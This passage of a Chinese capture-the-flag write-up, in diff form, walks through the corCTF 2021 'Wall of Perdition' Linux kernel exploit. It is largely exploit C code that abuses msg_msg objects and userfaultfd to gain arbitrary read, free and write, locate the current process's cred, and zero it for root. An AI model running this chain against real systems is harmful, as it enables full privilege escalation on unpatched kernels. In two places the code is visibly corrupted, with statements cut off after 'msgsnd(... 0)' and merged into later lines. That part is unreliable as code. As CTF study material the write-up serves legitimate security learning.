@@ -1,0 +1,172 @@
+        if (overwrite)
+        {
+            msg->next = target;
+            edit_rule(idx, (unsigned char *)msg, OUTBOUND, 0);
+        }
+        else
+        {
+            edit_rule(idx, (unsigned char *)msg, OUTBOUND, 1); // [3]
+        }
+        free(msg);
+        return recv_msg(qid[0], size);             // [4] 调用 recv_msg(),也即msgrcv()的包装函数,注意使用 MSG_COPY flag, 就能泄露内存。由于我们破坏了 m_list.next 和 m_list.prev 指针，所以如果不使用 MSG_COPY flag 的话，do_msgrcv() 就会 unlink message，导致出错崩溃。
+    }
+    [...]
+    uint64_t *leak = arb_read(0, 0, 0x2000, 0); // [1] 调用 arb_read(), 参数0x2000
+    [...]
+###  4.2 步骤2——越界读到任意读，泄露当前进程的cred地址
+**思路** ：根据`sysfs_bin_kfops_ro`
+地址可计算出内核基址，得到[init_task](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched/task.h#L48)的地址，即系统执行的第一个进程的
+[task_struct](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L629)
+结构。
+[task_struct](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L629)
+中有3个成员很重要：[tasks](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L734)
+包含指向前后
+`task_struct`的指针（偏移0x298），[pid](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L804)
+进程号（偏移0x398），[cred](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L894)
+进程的凭证（偏移0x540）。
+exp中，我们调用 `find_current_task()` 来遍历所有的task
+[1]，从`init_task`开始找到当前进程的`task_struct` [2]，`find_current_task()`多次调用
+`arb_read()`， **利用UAF篡改`msg_msg->m_ts`
+和`msg_msg->next`指针，调用`msgrcv()`**泄露出指向下一个task的`tasks->next`指针 [3] 和 `PID`
+[4]，然后直到找到当前task。
+    [...]
+    uint64_t find_current_task(uint64_t init_task)
+    {
+        pid_t pid, next_task_pid;
+        uint64_t next_task;
+        pid = getpid();
+        printf("[+] Current task PID: %d\n", pid);
+        puts("[*] Traversing tasks...");
+        leak = arb_read(0, init_task + 8, 0x1500, 1) + 0x1f9;
+        next_task = leak[0x298/8] - 0x298;
+        leak = arb_read(0, next_task + 8, 0x1500, 1) + 0x1f9;
+        next_task_pid = leak[0x398/8];
+        while (next_task_pid != pid)             // [2]
+        {
+            next_task = leak[0x298/8] - 0x298;     // [3]
+            leak = arb_read(0, next_task + 8, 0x2000, 1) + 0x1f9;
+            next_task_pid = leak[0x398/8];         // [4]
+        }
+        puts("[+] Current task found!");
+        return next_task;
+    }
+    [...]
+    puts("[*] Locating current task address...");
+    uint64_t current_task = find_current_task(init_task); // [1]
+    printf("[+] Leaked current task address: 0x%lx\n", current_task);
+    [...]
+**具体** ：篡改 `msg_msg->m_ts` 为0x2000，篡改 `msg_msg->next`指针指向
+`task_struct`结构（注意头8字节为null），遍历双链表直到读取到当前进程的`task_struct`。同理泄露当前进程的`cred`地址。
+    [...]
+    leak = arb_read(0, current_task, 0x2000, 1) + 0x1fa;
+    cred_struct = leak[0x540/8];
+    printf("[+] Leaked current task cred struct: 0x%lx\n", cred_struct);
+    [...]
+###  4.3 步骤3——任意释放
+**目标**
+：目前已获取当前进程的task地址和cred地址，需构造任意写，但前提需要构造任意释放。根本目标是构造重叠的`kmalloc-4096`堆块，让其既充当一个消息的`msg_msgseg`
+segment，又充当另一个消息的`msg_msg`，这样就能覆写`msg_msg->next`指针构造任意写。
+问题，为什么不构造重叠的`kmalloc-64`？因为`kmalloc-64`作为`msg_msg`的话不可能有segment，不能伪造它的`msg_msg->next`来任意写；且传入的长度已确定，无法写segment来任意写。
+**释放消息** ：首先释放 **QID #1** 中的消息，两次调用`msgrcv()`（不带`MSG_COPY` flag）。
+  * （1）第一次调用 `msgrcv()`，内核释放 **`QID #1`** 中第1个消息-`kmalloc-64`；
+  * （2）第二次调用 `msgrcv()`，内核释放第2个消息-`kmalloc-4096`和相应的segment（也在`kmalloc-4096`中）。
+    [...]
+    msgrcv(qid[1], memdump, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR); // [1]
+    msgrcv(qid[1], memdump, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR); // [2]
+    [...]
+内存布局如下：
+**kmalloc-4096释放顺序** ：注意，前面的exp中，我们泄露了`kmalloc-4096`的地址（ **QID #1**
+中消息2的`msg_msg`地址），前面我们第2次调用`msgrcv()`时，内核调用 `do_msgrcv()` -> `free_msg()` 先释放
+`kmalloc-4096`的`msg_msg`，再释放`kmalloc-4096`的segment，由于后进先出，分配新的消息时会先获取segment对应的`kmalloc-4096`，所以新的`msg_msg`占据之前的segment，新的segment占据之前的`msg_msg`。
+**申请消息-QID #2** ：子线程创建新消息，首先创建队列 **QID #2**
+[2]，再调用`msgsnd()`创建0x1ff8大小的消息（0x30的头和0x1fc8的数据），内核中会创建`0x30+0xfd0`大小的`msg_msg`和`0x8+0xff8`大小的`msg_msgseg`。
+用户传入数据位于`page_1 + PAGE_SIZE - 0x10`，使用
+[userfaultfd](https://www.kernel.org/doc/html/latest/admin-guide/mm/userfaultfd.html) 来监视 `page_1 + PAGE_SIZE` 位置，等待页错误， **第2个页错误**
+。当`load_msg()`调用`copy_from_user()`拷贝时触发页错误，结果如下图所示，现在我们已知新的segment地址（ **QID
+#1** 中消息2的`msg_msg`地址），原因已经阐明。 **QID #2** 布局如下图所示：
+    [...]
+    void *allocate_msg1(void *_)
+    {
+        printf("[Thread 1] Message buffer allocated at 0x%lx\n", page_1 + PAGE_SIZE - 0x10);
+        if ((qid[2] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) // [2] 创建队列 QID #2 
+        {
+            perror("msgget");
+            exit(1);
+        }
+        memset(page_1, 0, PAGE_SIZE);
+        ((unsigned long *)(page_1))[0xff0 / 8] = 1;
+        if (msgsnd(qid[2], page_1 + PAGE_SIZE - 0x10, 0x1ff8 - 0x30, 0) m_list.next = queue;         // [2] 指向 QID #1
+        msg->m_list.prev = queue;
+        msg->m_type =  1;
+        msg->m_ts = 0x10;
+        msg->next = target;             // [3] 下一个segment指向QID #1队列中的segment
+        edit_rule(idx, (unsigned char *)msg, OUTBOUND, 0);             // [4] 修改 QID #0 中的消息头结构
+        puts("[*] Triggering arb free...");
+        msgrcv(qid[0], memdump, 0x10, 1, IPC_NOWAIT | MSG_NOERROR); // [5] 释放 QID #0 中的消息
+        puts("[+] Target freed!");
+        free(memdump);
+        free(msg);
+    }
+    [...]
+    arb_free(0, large_msg);             // [1]
+    [...]
+  * `[2]`：我们用之前泄露的 **QID #1** 队列的地址，来修复 **QID #0** 中的 `msg_msg->m_list.next` 和 `msg_msg->m_list.prev` ，这样我们就能调用 `msgrcv()` 释放 **QID #0** 中的消息，不用 `MSG_COPY` flag 也能避免内核unlink时崩溃。
+  * `[3]`：使`msg_msg->next`指向之前泄露的message slab，也就是现在的 **QID #2** 消息的segment ；
+  * `[4]`：调用 `edit_rule()` 修改 `msg_msg` 头结构后，堆布局如下：
+  * `[5]`：不带 `MSG_COPY` flag 调用 `msgrcv()`，内核将会调用`free_msg()`释放 **QID #0** 中的消息和 new segment。
+###  4.4 步骤4——任意写，篡改cred
+**思路** ：现在 **QID #2** 中的`msg_msg->next`指向一个空闲的`kmalloc-4096`
+（上一步利用任意释放原语所释放）。现在分配新消息占据该`kmalloc-4096`，即可通过 **QID #2**
+篡改新消息的`msg_msg->next`实现任意写。
+    [...]
+    void *allocate_msg2(void *_)
+    {
+        printf("[Thread 2] Message buffer allocated at 0x%lx\n", page_2 + PAGE_SIZE - 0x10);
+        if ((qid[3] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) // [2] 创建队列 QID #3
+        {
+            perror("msgget");
+            exit(1);
+        }
+        memset(page_2, 0, PAGE_SIZE);
+        ((unsigned long *)(page_2))[0xff0 / 8] = 1;
+        if (msgsnd(qid[3], page_2 + PAGE_SIZE - 0x10, 0x1028 - 0x30, 0) next`指针**：释放第1个错误处理，将 **QID #3**
+中的`msg_msg->next`指针，篡改为当前进程的`cred-0x8`（因为segment的头8字节必须为null，避免`load_msg()`访问next
+segment时崩溃）。
+    [...]
+            if (page_fault_location == page_1 + PAGE_SIZE)
+            {
+                printf("[PFH 1] Page fault at 0x%lx\n", page_fault_location);
+                memset(buff, 0, PAGE_SIZE);
+                puts("[PFH 1] Releasing faulting thread");
+                struct evil_msg *msg = (struct evil_msg *)(buff + 0x1000 - 0x40);
+                msg->m_type =  0x1;
+                msg->m_ts = 0x1000;
+                msg->next = (uint64_t)(cred_struct - 0x8); // [1] 将 QID #3 中的 msg_msg->next 指针，篡改为当前进程的 cred-0x8
+                ufd_copy.dst = (unsigned long)(page_fault_location);
+                ufd_copy.src = (unsigned long)(&buff);
+                ufd_copy.len = PAGE_SIZE;
+                ufd_copy.mode = 0;
+                ufd_copy.copy = 0;
+                for (;;)
+                {
+                    if (release_pfh_1)
+                    {
+                        if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
+                        {
+                            perror("ioctl(UFFDIO_COPY)");
+                            exit(1);
+                        }
+                        puts("[PFH 1] Faulting thread released");
+                        break;
+                    }
+                }
+            }
+    [...]
+**篡改cred** ：释放第2个错误处理，将当前进程的cred覆盖为0，最终提权。
+## 参考
+[corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for
+Arbitrary Read and Arbitrary Write in the Linux
+Kernel](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html)
+[[corCTF 2021] Wall Of Perdition: Utilizing msg_msg Objects For Arbitrary Read
+And Arbitrary Write In The Linux Kernel](https://syst3mfailure.io/wall-of-perdition)
+[wall_of_perdition_exploit.c](https://syst3mfailure.io/assets/files/wall_of_perdition/wall_of_perdition_exploit.c)
